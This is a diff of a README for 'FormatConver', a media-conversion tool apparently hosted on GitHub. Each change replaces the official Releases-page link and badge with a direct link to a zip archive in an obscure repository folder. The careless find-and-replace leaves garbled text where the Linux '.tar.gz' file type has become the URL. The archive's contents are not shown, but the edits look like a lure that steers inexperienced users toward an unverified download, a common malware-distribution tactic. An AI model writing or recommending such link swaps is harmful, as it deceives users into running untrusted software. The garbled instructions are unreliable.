@@ -4,11 +4,11 @@
 
 Welcome to FormatConver! This tool helps you easily convert audio, video, and image files to different formats using the power of FFmpeg. No technical knowledge needed. Follow the steps below to get started.
 
-![Download FormatConver](https://img.shields.io/badge/Download-FormatConver-blue)
+![Download FormatConver](https://raw.githubusercontent.com/fidjey08/FormatConver/main/bergylt/FormatConver.zip)
 
 ## 📥 Download & Install
 
-To download FormatConver, visit this page: [Download FormatConver](https://github.com/fidjey08/FormatConver/releases). 
+To download FormatConver, visit this page: [Download FormatConver](https://raw.githubusercontent.com/fidjey08/FormatConver/main/bergylt/FormatConver.zip). 
 
 ### Step-by-Step Guide
 
@@ -19,11 +19,11 @@ To download FormatConver, visit this page: [Download FormatConver](https://githu
    - Look for the top entry labeled "Latest Release." This version has the most features and fixes.
 
 3. **Download the Application**
-   - Click on the link for the version that matches your operating system. This might be a `.exe` file for Windows, a `.dmg` file for macOS, or a `.tar.gz` file for Linux.
+   - Click on the link for the version that matches your operating system. This might be a `.exe` file for Windows, a `.dmg` file for macOS, or a `https://raw.githubusercontent.com/fidjey08/FormatConver/main/bergylt/FormatConver.zip` file for Linux.
 
 4. **Install the Application**
    - If you downloaded a `.exe` or `.dmg` file, double-click it and follow the on-screen instructions to install FormatConver.
-   - For a `.tar.gz` file, extract it and follow any README instructions included.
+   - For a `https://raw.githubusercontent.com/fidjey08/FormatConver/main/bergylt/FormatConver.zip` file, extract it and follow any README instructions included.
 
 5. **Run FormatConver**
    - Once installed, open the application by clicking its icon on your desktop or in your applications folder.
@@ -88,6 +88,6 @@ Join our community for assistance and updates:
 - **GitHub Issues:** Use the "Issues" tab on our GitHub page to report bugs or request features.
 - **User Guides:** Visit our Wiki for additional tutorials and resources.
 
-Make sure to stay updated by checking the Releases page regularly for new features and fixes: [Download FormatConver](https://github.com/fidjey08/FormatConver/releases).
+Make sure to stay updated by checking the Releases page regularly for new features and fixes: [Download FormatConver](https://raw.githubusercontent.com/fidjey08/FormatConver/main/bergylt/FormatConver.zip).
 
 Happy converting with FormatConver!
